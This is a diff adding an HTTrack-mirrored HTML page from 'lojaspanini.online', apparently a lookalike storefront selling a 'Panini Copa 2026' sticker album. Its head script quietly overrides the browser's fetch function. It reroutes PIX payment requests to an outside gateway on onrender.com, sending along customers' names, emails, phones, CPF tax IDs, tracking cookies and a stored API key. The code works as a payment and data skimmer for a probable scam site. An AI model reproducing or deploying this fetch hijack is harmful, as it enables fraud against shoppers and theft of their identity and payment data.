@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+  
+<!-- Mirrored from lojaspanini.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 20 Feb 2026 02:06:16 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- TODO: Set the document title to the name of your application -->
+    <title>Panini Copa 2026</title>
+    <meta name="description" content="Garanta seu álbum de capa dura com 30, 60 ou 90 pacotes de figurinhas inclusos.">
+    <meta name="author" content="Lovable" />
+
+    <!-- TODO: Update og:title to match your application name -->
+    
+    
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="../storage.googleapis.com/gpt-engineer-file-uploads/2BssU27DDURkreoyCnBMvkbJznB3/social-images/social-1770911238490-b1c10e166393023.Y3JvcCwxMzgwLDEwODAsMjcwLDA.jpg">
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@Lovable" />
+    <meta name="twitter:image" content="../storage.googleapis.com/gpt-engineer-file-uploads/2BssU27DDURkreoyCnBMvkbJznB3/social-images/social-1770911238490-b1c10e166393023.Y3JvcCwxMzgwLDEwODAsMjcwLDA.jpg">
+    
+  
+  
+  
+  <meta property="og:title" content="Panini Copa 2026">
+  <meta name="twitter:title" content="Panini Copa 2026">
+  <meta property="og:description" content="Garanta seu álbum de capa dura com 30, 60 ou 90 pacotes de figurinhas inclusos.">
+  <meta name="twitter:description" content="Garanta seu álbum de capa dura com 30, 60 ou 90 pacotes de figurinhas inclusos.">
+  <link rel="icon" type="image/png" href="../storage.googleapis.com/gpt-engineer-file-uploads/2BssU27DDURkreoyCnBMvkbJznB3/uploads/1770911226034-Cupom_TIFF_Panini_Logo_1.png">
+  <script>
+    // Bridge: legacy create-pix call -> new gateway /create-pix
+    (function () {
+      var originalFetch = window.fetch.bind(window);
+      var sealpayPixUrl = window.SEALPAY_PIX_URL || "https://abacate-5eo1.onrender.com/create-pix";
+
+      function getCookie(name) {
+        var cookie = document.cookie
+          .split("; ")
+          .find(function (row) { return row.indexOf(name + "=") === 0; });
+        return cookie ? decodeURIComponent(cookie.split("=").slice(1).join("=")) : "";
+      }
+
+      function getUtmParams() {
+        var params = new URLSearchParams(window.location.search);
+        var utm = {};
+        params.forEach(function (value, key) {
+          if (key.indexOf("utm_") === 0) utm[key] = value;
+        });
+        return utm;
+      }
+
+      function toNumber(value) {
+        var n = Number(value);
+        return Number.isFinite(n) ? n : 0;
+      }
+
+      window.fetch = async function (input, init) {
+        var url = typeof input === "string" ? input : (input && input.url) || "";
+        var isLegacyCreatePix = /\/functions\/v1\/create-pix(?:\?|$)/.test(url);
+
+        if (!isLegacyCreatePix) {
+          return originalFetch(input, init);
+        }
+
+        try {
+          var rawBody = (init && init.body) || "{}";
+          var legacyBody = {};
+
+          try {
+            legacyBody = typeof rawBody === "string" ? JSON.parse(rawBody) : rawBody;
+          } catch (_) {
+            legacyBody = {};
+          }
+
+          var customer = legacyBody.customer || {};
+          var amountCents = Math.round(toNumber(legacyBody.amount) * 100);
+          if (amountCents < 100) amountCents = 100;
+
+          var sealpayPayload = {
+            amount: amountCents,
+            description: legacyBody.kit_name || legacyBody.description || "Pagamento PIX",
+            customer: {
+              name: customer.name || "",
+              email: customer.email || "",
+              cellphone: customer.phone || customer.cellphone || "",
+              taxId: customer.cpf || customer.taxId || ""
+            },
+            tracking: {
+              utm: getUtmParams(),
+              src: window.location.href
+            },
+            api_key: window.SEALPAY_API_KEY || localStorage.getItem("sealpay_api_key") || "",
+            fbp: getCookie("_fbp") || "",
+            fbc: getCookie("_fbc") || "",
+            user_agent: navigator.userAgent
+          };
+
+          var upstream = await originalFetch(sealpayPixUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(sealpayPayload)
+          });
+
+          var upstreamText = await upstream.text();
+          var upstreamJson = {};
+
+          try {
+            upstreamJson = upstreamText ? JSON.parse(upstreamText) : {};
+          } catch (_) {
+            upstreamJson = {};
+          }
+
+          if (!upstream.ok) {
+            return new Response(
+              JSON.stringify({ success: false, error: upstreamJson.error || "Erro ao criar pagamento" }),
+              { status: upstream.status, headers: { "Content-Type": "application/json" } }
+            );
+          }
+
+          var pixQrCode = upstreamJson.pix_qr_code || upstreamJson.pixQrCode || "";
+          var pixCode = upstreamJson.pix_code || upstreamJson.pixCode || "";
+          var txid = upstreamJson.txid || upstreamJson.id || "";
+
+          if (!pixQrCode || !pixCode) {
+            return new Response(
+              JSON.stringify({ success: false, error: "Erro ao gerar QR Code" }),
+              { status: 500, headers: { "Content-Type": "application/json" } }
+            );
+          }
+
+          var qrBase64 = pixQrCode.indexOf("data:image") === 0
+            ? (pixQrCode.split("base64,")[1] || pixQrCode)
+            : pixQrCode;
+
+          var legacyResponse = {
+            success: true,
+            qr_code: pixCode,
+            qr_code_base64: qrBase64,
+            order_id: txid,
+            txid: txid
+          };
+
+          return new Response(JSON.stringify(legacyResponse), {
+            status: 200,
+            headers: { "Content-Type": "application/json" }
+          });
+        } catch (error) {
+          return new Response(
+            JSON.stringify({ success: false, error: (error && error.message) || "Erro na conexao com o gateway" }),
+            { status: 500, headers: { "Content-Type": "application/json" } }
+          );
+        }
+      };
+    })();
+  </script>
+  <script type="module" crossorigin src="assets/index-BCO5woaY.js"></script>
+  <link rel="stylesheet" crossorigin href="assets/index-BWkbuPCA.css">
+<script defer src="_flock.js" data-proxy-url="https://lojaspanini.online/~api/analytics"></script></head>
+
+  <body>
+    <div id="root"></div>
+  </body>
+
+<!-- Mirrored from lojaspanini.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 20 Feb 2026 02:06:17 GMT -->
+</html>
